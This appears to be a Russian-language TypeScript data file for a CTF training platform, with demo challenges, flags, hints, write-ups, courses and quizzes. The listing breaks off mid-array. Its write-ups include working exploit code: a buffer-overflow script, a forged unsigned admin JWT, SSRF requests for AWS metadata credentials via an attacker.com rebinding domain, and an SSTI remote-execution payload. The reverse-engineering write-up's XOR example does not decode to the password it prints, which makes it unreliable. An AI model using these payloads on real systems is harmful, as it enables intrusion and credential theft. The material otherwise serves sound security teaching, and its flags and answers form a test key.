// ============================================================
// ХРАНИЛИЩЕ ДАННЫХ (localStorage)
// Здесь находятся все демо-данные и функции для работы с ними.
// Чтобы добавить новые задачи — редактируй массивы TASKS_BEGINNER / TASKS_ADVANCED.
// Чтобы добавить курсы — редактируй COURSES_BEGINNER / COURSES_ADVANCED.
// ============================================================

export type Level = 'beginner' | 'advanced';
export type Difficulty = 'easy' | 'medium' | 'hard';
export type TaskCategory = 'crypto' | 'stego' | 'web' | 'linux' | 'forensics' | 'pwn' | 'reverse' | 'misc';

export interface User {
  id: string;
  name: string;
  level: Level;
  score: number;
  solvedTasks: string[];
  completedCourses: string[];
  completedModules: string[];
  avatar: string;
  joinDate: string;
}

export interface Task {
  id: string;
  title: string;
  description: string;
  category: TaskCategory;
  difficulty: Difficulty;
  points: number;
  flag: string;
  level: Level;
  hints: string[];
  writeup: {
    title: string;
    explanation: string;
    code: string;
  };
  solvedCount: number;
}

export interface Course {
  id: string;
  title: string;
  description: string;
  level: Level;
  category: TaskCategory;
  moduleCount: number;
  totalHours: number;
  modules: Module[];
}

export interface Module {
  id: string;
  title: string;
  videoUrl: string;
  theory: string;
  quiz: QuizQuestion[];
  taskIds: string[];
}

export interface QuizQuestion {
  question: string;
  options: string[];
  correct: number;
}

export interface CTFEvent {
  id: string;
  title: string;
  description: string;
  startDate: string;
  endDate: string;
  level: Level | 'all';
  participants: number;
  prizes: string[];
  tags: string[];
}

// ============================================================
// ДЕМО-ДАННЫЕ: ЗАДАЧИ
// ============================================================
export const ALL_TASKS: Task[] = [
  // --- ЗАДАЧИ ДЛЯ НОВИЧКОВ ---
  {
    id: 'task-1',
    title: 'Привет, мир!',
    description: 'Твоя первая задача. Флаг спрятан прямо в исходном коде страницы. Открой DevTools (F12), перейди во вкладку Elements и поищи скрытый комментарий.',
    category: 'web',
    difficulty: 'easy',
    points: 10,
    flag: 'flag{welcome_to_cyber}',
    level: 'beginner',
    hints: [
      'Открой DevTools браузера (F12)',
      'Посмотри в HTML-комментарии исходного кода',
      'Ищи тег <!-- flag{...} -->',
    ],
    writeup: {
      title: 'Просмотр исходного кода страницы',
      explanation: 'Многие начинающие разработчики оставляют чувствительные данные прямо в HTML-комментариях. Чтобы их найти, достаточно нажать F12 и изучить DOM-дерево или нажать Ctrl+U для просмотра исходника.',
      code: `<!-- В исходном коде страницы был скрыт комментарий: -->
<!-- flag{welcome_to_cyber} -->

# Урок: никогда не оставляй секреты в HTML!`,
    },
    solvedCount: 247,
  },
  {
    id: 'task-2',
    title: 'Base64 детектив',
    description: 'Строка "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" выглядит как шифр. Но так ли это? Декодируй её и получи флаг.',
    category: 'crypto',
    difficulty: 'easy',
    points: 15,
    flag: 'flag{base64_is_not_encryption}',
    level: 'beginner',
    hints: [
      'Base64 — это кодировка, а не шифрование',
      'Используй CyberChef или команду: echo "строка" | base64 -d',
      'В конце строки часто стоит символ = или ==',
    ],
    writeup: {
      title: 'Base64 — кодирование, а не шифрование',
      explanation: 'Base64 — это способ представления бинарных данных в текстовом виде. Он не обеспечивает никакой защиты, поскольку является полностью обратимым без ключа. Часто используется для передачи данных в JWT, email-вложениях и API.',
      code: `# Python
import base64
encoded = "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259"
print(base64.b64decode(encoded).decode())
# Вывод: flag{base64_is_not_encryption}

# Bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d`,
    },
    solvedCount: 189,
  },
  {
    id: 'task-3',
    title: 'Скрытое в картинке',
    description: 'В этом изображении спрятан текст. Используй метод стеганографии LSB (Least Significant Bit) для извлечения данных.',
    category: 'stego',
    difficulty: 'medium',
    points: 30,
    flag: 'flag{lsb_stego_master}',
    level: 'beginner',
    hints: [
      'Попробуй инструмент steghide или zsteg',
      'Метод LSB прячет данные в последних битах пикселей',
      'Команда: steghide extract -sf image.jpg',
    ],
    writeup: {
      title: 'LSB-стеганография',
      explanation: 'LSB (Least Significant Bit) — метод сокрытия данных в изображениях. Последний бит каждого пикселя незаметно изменяется для хранения секретных данных. Человеческий глаз не различает это изменение, но специальные утилиты легко его обнаруживают.',
      code: `# Установка и использование steghide
apt install steghide
steghide extract -sf secret_image.jpg -p ""

# Или с помощью Python + PIL:
from PIL import Image
img = Image.open("secret_image.jpg")
pixels = list(img.getdata())
# Извлекаем последние биты...`,
    },
    solvedCount: 98,
  },
  {
    id: 'task-4',
    title: 'Linux: найди флаг',
    description: 'Флаг спрятан где-то в файловой системе Linux. Файл называется "flag.txt". Найди его любым способом.',
    category: 'linux',
    difficulty: 'easy',
    points: 10,
    flag: 'flag{find_command_is_powerful}',
    level: 'beginner',
    hints: [
      'Используй команду find',
      'find / -name "flag.txt" 2>/dev/null',
      'Флаг находится в /home/user/hidden/flag.txt',
    ],
    writeup: {
      title: 'Команда find в Linux',
      explanation: 'Команда find — один из основных инструментов Linux для поиска файлов. 2>/dev/null скрывает ошибки доступа, что ускоряет поиск. Знание базовых команд Linux — обязательный навык для специалиста по ИБ.',
      code: `# Найти файл по имени
find / -name "flag.txt" 2>/dev/null

# Найти файлы, модифицированные за последние 24 часа
find / -mtime -1 2>/dev/null

# Найти файлы с интересными правами
find / -perm /4000 2>/dev/null  # SUID-файлы`,
    },
    solvedCount: 312,
  },

  // --- ЗАДАЧИ ДЛЯ ОПЫТНЫХ ---
  {
    id: 'task-5',
    title: 'Buffer Overflow 101',
    description: 'Бинарный файл принимает строку на вход. Длина буфера — 64 байта. Перезапиши return address и получи shell. Бинарь скомпилирован без защит: -fno-stack-protector -no-pie.',
    category: 'pwn',
    difficulty: 'medium',
    points: 50,
    flag: 'flag{b0f_m4st3r}',
    level: 'advanced',
    hints: [
      'Определи смещение до return address с помощью cyclic pattern',
      'Используй pwntools: cyclic(100), cyclic_find()',
      'Адрес win-функции: 0x400596 (найди через objdump -d binary)',
    ],
    writeup: {
      title: 'Stack Buffer Overflow — базовая эксплуатация',
      explanation: 'Buffer Overflow происходит, когда программа записывает больше данных в буфер, чем он может вместить. Это позволяет перезаписать return address и перенаправить выполнение на произвольный код. Без защит PIE/ASLR адреса функций фиксированы.',
      code: `from pwn import *

# Подключаемся к цели
p = process('./vulnerable_binary')

# Создаём payload: 64 байта мусора + 8 байт (сохранённый rbp) + адрес win()
offset = 72  # 64 (буфер) + 8 (rbp)
win_addr = 0x400596

payload = b'A' * offset + p64(win_addr)

p.sendline(payload)
p.interactive()
# flag{b0f_m4st3r}`,
    },
    solvedCount: 67,
  },
  {
    id: 'task-6',
    title: 'JWT None Algorithm',
    description: 'Веб-приложение использует JWT для аутентификации. Попробуй изменить алгоритм подписи на "none" и стать администратором.',
    category: 'web',
    difficulty: 'medium',
    points: 60,
    flag: 'flag{jwt_none_alg}',
    level: 'advanced',
    hints: [
      'Декодируй JWT: base64url(header) + "." + base64url(payload) + "."',
      'Измени "alg": "HS256" → "alg": "none" в заголовке',
      'Измени "role": "user" → "role": "admin" в payload',
    ],
    writeup: {
      title: 'JWT None Algorithm Attack',
      explanation: 'Уязвимость "None Algorithm" возникает, когда сервер принимает JWT без подписи. Алгоритм "none" означает отсутствие верификации. Атака: меняем alg на "none", меняем payload, убираем подпись — сервер принимает токен.',
      code: `import base64
import json

# Исходный JWT
old_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# Новый заголовок с алгоритмом "none"
header = {"typ": "JWT", "alg": "none"}
payload = {"sub": "1234", "role": "admin", "iat": 1609459200}

def b64url(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b'=').decode()

# Токен без подписи
malicious_jwt = f"{b64url(header)}.{b64url(payload)}."
# Отправляем в заголовке: Authorization: Bearer <malicious_jwt>`,
    },
    solvedCount: 45,
  },
  {
    id: 'task-7',
    title: 'SSRF: Внутренняя сеть',
    description: 'Веб-приложение делает HTTP-запросы по URL, введённому пользователем. Получи доступ к внутреннему сервису на http://169.254.169.254 (AWS metadata).',
    category: 'web',
    difficulty: 'hard',
    points: 100,
    flag: 'flag{ssrf_cloud_pwned}',
    level: 'advanced',
    hints: [
      'SSRF = Server-Side Request Forgery',
      'AWS instance metadata: http://169.254.169.254/latest/meta-data/',
      'Попробуй обойти фильтры: http://[::ffff:169.254.169.254]/',
    ],
    writeup: {
      title: 'SSRF — захват облачных метаданных',
      explanation: 'SSRF позволяет атакующему заставить сервер делать запросы во внутреннюю сеть. Особенно опасно в облаке — по адресу 169.254.169.254 доступны IAM credentials, позволяющие захватить весь аккаунт.',
      code: `# Запрос к AWS metadata через уязвимый параметр
GET /fetch?url=http://169.254.169.254/latest/meta-data/

# Обход блокировок через IPv6
GET /fetch?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/

# Через DNS rebinding
# Регистрируем домен attacker.com -> 169.254.169.254
GET /fetch?url=http://attacker.com/latest/iam/security-credentials/

# Получаем Access Key, Secret Key, Token`,
    },
    solvedCount: 23,
  },
  {
    id: 'task-8',
    title: 'Reverse: CrackMe',
    description: 'Бинарник проверяет пароль. Разберись с алгоритмом проверки через дизассемблер и найди правильный ввод.',
    category: 'reverse',
    difficulty: 'hard',
    points: 80,
    flag: 'flag{r3v3rs3_3ng1ne3r}',
    level: 'advanced',
    hints: [
      'Открой в Ghidra или radare2',
      'Найди функцию check_password() или strcmp()',
      'Ключ XOR: 0x42',
    ],
    writeup: {
      title: 'Reverse Engineering с Ghidra',
      explanation: 'Reverse Engineering — анализ программ без исходного кода. Ghidra (от NSA) декомпилирует бинарники в псевдо-C. Часто пароли хранятся в виде XOR-обфускации или сравнения байтов.',
      code: `# Ghidra псевдо-C декомпиляция:
bool check_password(char *input) {
    char expected[] = {0x26,0x27,0x10,0x27,...};  // XOR 0x42
    for (int i=0; i<len; i++) {
        if (input[i] != (expected[i] ^ 0x42)) return false;
    }
    return true;
}

# Python — расшифровка
xor_key = 0x42
encrypted = [0x26, 0x27, 0x10, 0x27, 0x11, 0x10, 0x7f, 0x13]
password = ''.join(chr(b ^ xor_key) for b in encrypted)
print(password)  # → r3v3rs3_3ng1ne3r`,
    },
    solvedCount: 31,
  },
];

// ============================================================
// ДЕМО-ДАННЫЕ: КУРСЫ
// ============================================================
export const ALL_COURSES: Course[] = [
  {
    id: 'course-1',
    title: 'Основы криптографии',
    description: 'От шифра Цезаря до современных алгоритмов: RSA, AES, хэш-функции.',
    level: 'beginner',
    category: 'crypto',
    moduleCount: 4,
    totalHours: 3,
    modules: [
      {
        id: 'mod-1-1',
        title: 'Классические шифры',
        videoUrl: 'https://www.youtube.com/embed/AQDCe585Lnc',
        theory: 'Классические шифры — основа криптографии. Шифр Цезаря сдвигает каждую букву на N позиций. Шифр Виженера использует ключевое слово. Несмотря на свою простоту, они дали начало современной криптографии.',
        quiz: [
          { question: 'Что такое шифр Цезаря?', options: ['Сдвиг букв на N позиций', 'XOR с ключом', 'Перестановка символов', 'Блочный шифр'], correct: 0 },
          { question: 'Какой ключ у шифра ROT13?', options: ['13', '26', '7', '3'], correct: 0 },
          { question: 'Что такое частотный анализ?', options: ['Анализ частоты букв для взлома', 'Частота сигнала', 'Скорость шифрования', 'Длина ключа'], correct: 0 },
        ],
        taskIds: ['task-2'],
      },
      {
        id: 'mod-1-2',
        title: 'Хэш-функции',
        videoUrl: 'https://www.youtube.com/embed/b4b8ktEV4Bg',
        theory: 'Хэш-функции преобразуют данные произвольной длины в строку фиксированной длины. Свойства: необратимость, лавинный эффект, устойчивость к коллизиям. MD5, SHA-1 считаются устаревшими. Используй SHA-256 и выше.',
        quiz: [
          { question: 'Какое свойство хэш-функции означает невозможность восстановить оригинал?', options: ['Необратимость', 'Детерминизм', 'Лавинный эффект', 'Коллизия'], correct: 0 },
          { question: 'MD5 считается...', options: ['Устаревшим и небезопасным', 'Современным стандартом', 'Симметричным шифром', 'Протоколом'], correct: 0 },
          { question: 'Для хранения паролей лучше всего использовать:', options: ['bcrypt/Argon2', 'MD5', 'SHA-1', 'Base64'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-1-3',
        title: 'Симметричное шифрование',
        videoUrl: 'https://www.youtube.com/embed/AQDCe585Lnc',
        theory: 'Симметричное шифрование использует один ключ для шифрования и расшифровки. AES (Advanced Encryption Standard) — современный стандарт. Режимы: ECB (небезопасный!), CBC, GCM.',
        quiz: [
          { question: 'Что такое симметричное шифрование?', options: ['Один ключ для шифрования и расшифровки', 'Два разных ключа', 'Шифрование без ключа', 'Хэширование'], correct: 0 },
          { question: 'Почему режим ECB опасен?', options: ['Одинаковые блоки дают одинаковый шифротекст', 'Слишком медленный', 'Нет аутентификации', 'Слабый ключ'], correct: 0 },
          { question: 'Рекомендуемая длина ключа AES?', options: ['256 бит', '64 бит', '128 байт', '1024 бит'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-1-4',
        title: 'Асимметричная криптография',
        videoUrl: 'https://www.youtube.com/embed/AQDCe585Lnc',
        theory: 'RSA использует пару ключей: публичный (для шифрования) и приватный (для расшифровки). Основан на сложности факторизации больших чисел. Используется в HTTPS, SSH, цифровых подписях.',
        quiz: [
          { question: 'Сколько ключей в асимметричной криптографии?', options: ['2 (публичный и приватный)', '1', '3', 'Зависит от алгоритма'], correct: 0 },
          { question: 'На чём основана безопасность RSA?', options: ['Сложность факторизации', 'Дискретный логарифм', 'Случайные числа', 'XOR'], correct: 0 },
          { question: 'Где применяется асимметричная криптография?', options: ['HTTPS и SSH', 'Только в банках', 'В базах данных', 'Только в военных системах'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },
  {
    id: 'course-2',
    title: 'Веб-уязвимости: Начало',
    description: 'SQL-инъекции, XSS, CSRF — базовые атаки на веб-приложения и методы защиты.',
    level: 'beginner',
    category: 'web',
    moduleCount: 3,
    totalHours: 4,
    modules: [
      {
        id: 'mod-2-1',
        title: 'SQL-инъекции',
        videoUrl: 'https://www.youtube.com/embed/ciNHn38EyRc',
        theory: 'SQL-инъекция позволяет атакующему вмешаться в SQL-запросы приложения. Классический пример: \' OR \'1\'=\'1. Защита: параметризованные запросы (prepared statements), ORM.',
        quiz: [
          { question: 'Как защититься от SQL-инъекций?', options: ['Параметризованные запросы', 'Экранирование символов', 'Фильтрация на клиенте', 'Длинные пароли'], correct: 0 },
          { question: 'Что делает команда UNION в SQL-инъекции?', options: ['Объединяет результаты нескольких запросов', 'Удаляет данные', 'Создаёт таблицу', 'Обходит авторизацию'], correct: 0 },
          { question: 'Blind SQL-инъекция — это:', options: ['Атака без вывода данных напрямую', 'SQL без WHERE', 'Ошибка базы данных', 'Тип XSS'], correct: 0 },
        ],
        taskIds: ['task-1'],
      },
      {
        id: 'mod-2-2',
        title: 'XSS-атаки',
        videoUrl: 'https://www.youtube.com/embed/ciNHn38EyRc',
        theory: 'Cross-Site Scripting (XSS) позволяет внедрить вредоносный JavaScript на страницу. Reflected XSS — в URL, Stored XSS — в базе данных, DOM-based — в DOM. Защита: CSP, экранирование вывода.',
        quiz: [
          { question: 'Stored XSS опаснее Reflected XSS потому что:', options: ['Сохраняется в БД и атакует всех пользователей', 'Работает быстрее', 'Не требует ссылки', 'Обходит CSP'], correct: 0 },
          { question: 'Content Security Policy (CSP) защищает от:', options: ['XSS-атак', 'SQL-инъекций', 'CSRF', 'DDoS'], correct: 0 },
          { question: 'Как экранировать вывод в HTML?', options: ['& → &amp; < → &lt; > → &gt;', 'Использовать eval()', 'Добавить noScript', 'Только HTTPS'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-2-3',
        title: 'CSRF и Broken Auth',
        videoUrl: 'https://www.youtube.com/embed/ciNHn38EyRc',
        theory: 'CSRF заставляет браузер жертвы выполнить нежелательное действие. Broken Authentication — неправильная реализация авторизации: слабые сессии, отсутствие rate limiting.',
        quiz: [
          { question: 'CSRF-токен защищает от:', options: ['Межсайтовых запросов от злоумышленника', 'XSS', 'SQL-инъекций', 'Brute force'], correct: 0 },
          { question: 'SameSite cookie помогает против:', options: ['CSRF', 'XSS', 'SQL-инъекций', 'Path traversal'], correct: 0 },
          { question: 'Rate limiting защищает от:', options: ['Перебора паролей', 'XSS', 'SSRF', 'Buffer Overflow'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },
  {
    id: 'course-3',
    title: 'Linux для безопасника',
    description: 'Командная строка, права доступа, сетевые утилиты, bash-скриптинг.',
    level: 'beginner',
    category: 'linux',
    moduleCount: 3,
    totalHours: 5,
    modules: [
      {
        id: 'mod-3-1',
        title: 'Базовые команды',
        videoUrl: 'https://www.youtube.com/embed/oxuRxtrO2Ag',
        theory: 'Базовые команды Linux необходимы каждому специалисту по ИБ. ls, cd, find, grep, cat, chmod — основа работы в терминале. Умение быстро ориентироваться в файловой системе критично при анализе инцидентов.',
        quiz: [
          { question: 'Как найти все файлы с расширением .log?', options: ['find / -name "*.log"', 'search *.log', 'locate *.log /all', 'grep -r .log /'], correct: 0 },
          { question: 'Права 755 означают:', options: ['rwxr-xr-x', 'rwxrwxrwx', 'r-xr-xr-x', 'rw-r--r--'], correct: 0 },
          { question: 'Команда для просмотра сетевых соединений:', options: ['netstat -an / ss -an', 'ifconfig -a', 'route -n', 'iptables -L'], correct: 0 },
        ],
        taskIds: ['task-4'],
      },
      {
        id: 'mod-3-2',
        title: 'Права доступа и SUID',
        videoUrl: 'https://www.youtube.com/embed/oxuRxtrO2Ag',
        theory: 'SUID-бит (Set User ID) позволяет запускать файл с правами владельца. Это вектор для privilege escalation: если SUID-файл уязвим, можно получить root. Команда поиска: find / -perm /4000.',
        quiz: [
          { question: 'Что такое SUID-бит?', options: ['Запуск с правами владельца файла', 'Зашифрованный файл', 'Системный файл', 'Только для root'], correct: 0 },
          { question: 'Как найти все SUID-файлы?', options: ['find / -perm /4000 2>/dev/null', 'ls -la /bin', 'chmod 4000 /*', 'getfacl /'], correct: 0 },
          { question: 'Privilege Escalation — это:', options: ['Повышение привилегий до root', 'Подбор пароля', 'DDoS атака', 'SQL-инъекция'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-3-3',
        title: 'Wireshark и сетевой анализ',
        videoUrl: 'https://www.youtube.com/embed/TkCSr30UojM',
        theory: 'Wireshark — анализатор сетевого трафика. Позволяет перехватывать и анализировать пакеты. Фильтры: http, tcp.port == 80, ip.addr == 192.168.1.1. Полезен для анализа PCAP-файлов в CTF.',
        quiz: [
          { question: 'Wireshark используется для:', options: ['Анализа сетевого трафика', 'Взлома WiFi', 'Сканирования портов', 'Шифрования трафика'], correct: 0 },
          { question: 'Фильтр для HTTP-трафика в Wireshark:', options: ['http', 'tcp:80', 'port http', 'filter:web'], correct: 0 },
          { question: 'PCAP-файл содержит:', options: ['Захваченные сетевые пакеты', 'Программный код', 'Зашифрованные данные', 'Логи системы'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },

  // --- КУРСЫ ДЛЯ ОПЫТНЫХ ---
  {
    id: 'course-4',
    title: 'Binary Exploitation (pwn)',
    description: 'Stack overflow, ROP-цепочки, heap exploitation, format string attacks.',
    level: 'advanced',
    category: 'pwn',
    moduleCount: 4,
    totalHours: 8,
    modules: [
      {
        id: 'mod-4-1',
        title: 'Stack Buffer Overflow',
        videoUrl: 'https://www.youtube.com/embed/1S0aBV-Waeo',
        theory: 'Stack Buffer Overflow — классическая уязвимость: переполнение буфера на стеке перезаписывает return address. Инструменты: pwntools, GDB+PEDA/pwndbg, checksec для анализа защит.',
        quiz: [
          { question: 'Что перезаписывается при stack overflow?', options: ['Return address', 'Heap pointer', 'Global variable', 'Stack canary значение'], correct: 0 },
          { question: 'Checksec показывает:', options: ['Активные защиты бинарника', 'Открытые порты', 'Уязвимые функции', 'Хэш файла'], correct: 0 },
          { question: 'NX (No Execute) бит предотвращает:', options: ['Выполнение кода на стеке/куче', 'Buffer overflow', 'ROP атаки', 'Format string'], correct: 0 },
        ],
        taskIds: ['task-5'],
      },
      {
        id: 'mod-4-2',
        title: 'ROP Chains',
        videoUrl: 'https://www.youtube.com/embed/1S0aBV-Waeo',
        theory: 'Return Oriented Programming (ROP) — техника обхода NX. Использует "гаджеты" — фрагменты существующего кода, завершающиеся на ret. Инструменты: ROPgadget, ropper.',
        quiz: [
          { question: 'ROP обходит защиту:', options: ['NX (Non-Executable stack)', 'ASLR', 'Stack canary', 'PIE'], correct: 0 },
          { question: 'ROP-гаджет — это:', options: ['Фрагмент кода, заканчивающийся на ret', 'Уязвимая функция', 'Shellcode', 'Heap chunk'], correct: 0 },
          { question: 'Инструмент для поиска ROP-гаджетов:', options: ['ROPgadget', 'Wireshark', 'Metasploit', 'Burp Suite'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-4-3',
        title: 'Format String Attack',
        videoUrl: 'https://www.youtube.com/embed/1S0aBV-Waeo',
        theory: 'printf(user_input) без форматной строки — критическая уязвимость. %x читает со стека, %n записывает. Позволяет читать память и произвольно записывать данные по любому адресу.',
        quiz: [
          { question: 'printf(user_input) уязвим потому что:', options: ['Нет форматной строки — читает стек', 'Медленно работает', 'Не поддерживает Unicode', 'Buffer overflow'], correct: 0 },
          { question: '%n в format string:', options: ['Записывает количество символов по указателю', 'Выводит следующий аргумент', 'Читает из памяти', 'Завершает вывод'], correct: 0 },
          { question: 'Защита от format string — использовать:', options: ['printf("%s", user_input)', 'puts()', 'fprintf()', 'sprintf()'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-4-4',
        title: 'Heap Exploitation',
        videoUrl: 'https://www.youtube.com/embed/1S0aBV-Waeo',
        theory: 'Heap — динамическая память (malloc/free). Уязвимости: use-after-free, double free, heap overflow. Атаки: fastbin dup, tcache poisoning. Инструмент: pwndbg heap команды.',
        quiz: [
          { question: 'Use-After-Free — это:', options: ['Использование памяти после free()', 'Double malloc', 'Stack overflow', 'Integer overflow'], correct: 0 },
          { question: 'Tcache poisoning позволяет:', options: ['Получить malloc по произвольному адресу', 'Переполнить стек', 'Читать /etc/passwd', 'Создать shell'], correct: 0 },
          { question: 'Инструмент для анализа heap в GDB:', options: ['pwndbg / PEDA', 'Wireshark', 'strace', 'ltrace'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },
  {
    id: 'course-5',
    title: 'Продвинутый веб: SSRF, RCE',
    description: 'SSRF, десериализация, RCE, XXE, SSTI — сложные атаки на веб-приложения.',
    level: 'advanced',
    category: 'web',
    moduleCount: 3,
    totalHours: 6,
    modules: [
      {
        id: 'mod-5-1',
        title: 'SSRF и Cloud Security',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Server-Side Request Forgery позволяет атакующему заставить сервер делать запросы во внутреннюю инфраструктуру. Особенно опасно в облаке — доступ к instance metadata (169.254.169.254) даёт IAM credentials.',
        quiz: [
          { question: 'SSRF позволяет:', options: ['Делать запросы от имени сервера', 'Выполнять JS на клиенте', 'Читать файлы через SQL', 'Переполнять буфер'], correct: 0 },
          { question: 'Адрес AWS Instance Metadata Service:', options: ['169.254.169.254', '192.168.1.1', '127.0.0.1', '10.0.0.1'], correct: 0 },
          { question: 'Защита от SSRF — allowlist для:', options: ['Разрешённых хостов и схем', 'Длины URL', 'HTTP методов', 'Портов только 80/443'], correct: 0 },
        ],
        taskIds: ['task-7'],
      },
      {
        id: 'mod-5-2',
        title: 'Десериализация',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Небезопасная десериализация — когда приложение десериализует данные из ненадёжного источника. В Python (pickle), Java (ObjectInputStream), PHP (unserialize) это приводит к RCE.',
        quiz: [
          { question: 'Почему pickle.loads(user_data) опасен?', options: ['Позволяет выполнить произвольный Python-код', 'Медленно работает', 'Не поддерживает типы', 'Buffer overflow'], correct: 0 },
          { question: 'Безопасная альтернатива pickle для данных от пользователя:', options: ['JSON / protobuf', 'yaml.load()', 'marshal', 'shelve'], correct: 0 },
          { question: 'Java Gadget Chain используется для:', options: ['RCE через десериализацию', 'SQL-инъекций', 'XSS', 'CSRF'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-5-3',
        title: 'SSTI и Template Injection',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Server-Side Template Injection (SSTI) — внедрение кода в шаблонизатор. В Jinja2: {{7*7}} → 49. Может приводить к RCE: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\')}}',
        quiz: [
          { question: '{{7*7}} в Jinja2 выведет:', options: ['49', '{{7*7}}', 'Error', '7'], correct: 0 },
          { question: 'SSTI обнаруживается тестом:', options: ['{{7*7}}, ${7*7}, #{7*7}', 'OR 1=1', '<script>alert(1)', '../../../../etc/passwd'], correct: 0 },
          { question: 'Защита от SSTI:', options: ['Sandbox + экранирование пользовательского ввода', 'Только POST запросы', 'HTTPS', 'WAF'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },
  {
    id: 'course-6',
    title: 'Форензика и анализ инцидентов',
    description: 'Анализ дампов памяти, файловых систем, сетевых пакетов. Volatility, Autopsy.',
    level: 'advanced',
    category: 'forensics',
    moduleCount: 3,
    totalHours: 7,
    modules: [
      {
        id: 'mod-6-1',
        title: 'Анализ памяти (Volatility)',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Volatility — фреймворк для анализа дампов RAM. Команды: imageinfo, pslist, pstree, cmdline, filescan, dumpfiles. Позволяет восстановить запущенные процессы, сетевые соединения и артефакты вредоносного ПО.',
        quiz: [
          { question: 'Volatility используется для:', options: ['Анализа дампов оперативной памяти', 'Анализа сетевого трафика', 'Реверса бинарников', 'Взлома паролей'], correct: 0 },
          { question: 'Команда pslist в Volatility:', options: ['Выводит список процессов', 'Сканирует файловую систему', 'Дампает файлы', 'Показывает соединения'], correct: 0 },
          { question: 'Memory dump содержит:', options: ['Снимок RAM в определённый момент', 'Только файлы', 'Только сеть', 'Только процессы'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-6-2',
        title: 'Файловая форензика',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Анализ файловых систем: восстановление удалённых файлов (Autopsy, foremost), анализ метаданных (exiftool), поиск скрытых данных, анализ MFT (NTFS).',
        quiz: [
          { question: 'exiftool используется для:', options: ['Анализа метаданных файлов', 'Удаления вирусов', 'Шифрования файлов', 'Поиска уязвимостей'], correct: 0 },
          { question: 'foremost / Autopsy помогают:', options: ['Восстановить удалённые файлы', 'Анализировать сеть', 'Взламывать шифрование', 'Искать пароли'], correct: 0 },
          { question: 'MFT (Master File Table) — это:', options: ['Таблица файлов NTFS с метаданными', 'Протокол сети', 'Формат дампа', 'Алгоритм шифрования'], correct: 0 },
        ],
        taskIds: [],
      },
      {
        id: 'mod-6-3',
        title: 'Анализ вредоносного ПО',
        videoUrl: 'https://www.youtube.com/embed/GJXHQRuvn44',
        theory: 'Статический анализ: strings, file, objdump, Ghidra. Динамический анализ: запуск в sandbox (ANY.RUN, Cuckoo), мониторинг syscalls через strace, анализ сетевого трафика.',
        quiz: [
          { question: 'Команда strings показывает:', options: ['Читаемые строки в бинарнике', 'Список процессов', 'Сетевые соединения', 'Хэш файла'], correct: 0 },
          { question: 'Sandbox для анализа малвари — это:', options: ['Изолированная среда выполнения', 'Антивирус', 'Брандмауэр', 'VPN'], correct: 0 },
          { question: 'strace мониторит:', options: ['Системные вызовы процесса', 'Сетевой трафик', 'Файловую систему', 'Память'], correct: 0 },
        ],
        taskIds: [],
      },
    ],
  },
];

// ============================================================
// ДЕМО-ДАННЫЕ: CTF-СОРЕВНОВАНИЯ
// ============================================================
const getTargetDate = (daysFromNow: number) => {
  const d = new Date();
  d.setDate(d.getDate() + daysFromNow);
  return d.toISOString();
};

export const CTF_EVENTS: CTFEvent[] = [
  {
    id: 'event-1',
    title: 'CyberLearn CTF #12',
    description: 'Ежемесячный CTF для студентов. Задачи по всем категориям: web, crypto, pwn, forensics, misc. Рекомендован для опытных участников.',
    startDate: getTargetDate(14),
    endDate: getTargetDate(16),
    level: 'advanced',
    participants: 0,
    prizes: ['1 место: 1000 ₽ + сертификат', '2 место: 500 ₽ + сертификат', '3 место: сертификат'],
    tags: ['web', 'pwn', 'crypto', 'forensics'],
  },
  {
    id: 'event-2',
    title: 'Первые шаги в CTF',
    description: 'Дружелюбный CTF для новичков. Задачи объяснены по шагам, доступны подсказки. Отличная практика для тех, кто только начинает.',
    startDate: getTargetDate(7),
    endDate: getTargetDate(9),
    level: 'beginner',
    participants: 0,
    prizes: ['Сертификаты участника', 'Дополнительные очки на платформе', 'Разбор задач после CTF'],
    tags: ['web', 'crypto', 'stego', 'linux'],
  },
  {
    id: 'event-3',
    title: 'Open Security Challenge',
    description: 'Открытые соревнования для всех уровней. Задачи разделены по сложности. Совместное участие новичков и опытных.',
    startDate: getTargetDate(21),
    endDate: getTargetDate(23),
    level: 'all',
    participants: 0,
    prizes: ['Призы для каждой категории', 'Сертификаты', 'Возможность попасть в команду'],
    tags: ['all', 'web', 'pwn', 'misc'],
  },
];

// ============================================================
// ДЕМО-ПОЛЬЗОВАТЕЛИ (таблица лидеров)
// ============================================================
export const DEMO_LEADERBOARD: Omit<User, 'completedModules'>[] = [
  { id: 'u1', name: 'n0x_h4cker', level: 'advanced', score: 1250, solvedTasks: ['task-5','task-6','task-7','task-8'], completedCourses: ['course-4'], avatar: '🐉', joinDate: '2024-09-01' },
  { id: 'u2', name: 'cybergirl_', level: 'advanced', score: 980, solvedTasks: ['task-5','task-6','task-7'], completedCourses: ['course-5'], avatar: '⚡', joinDate: '2024-09-15' },
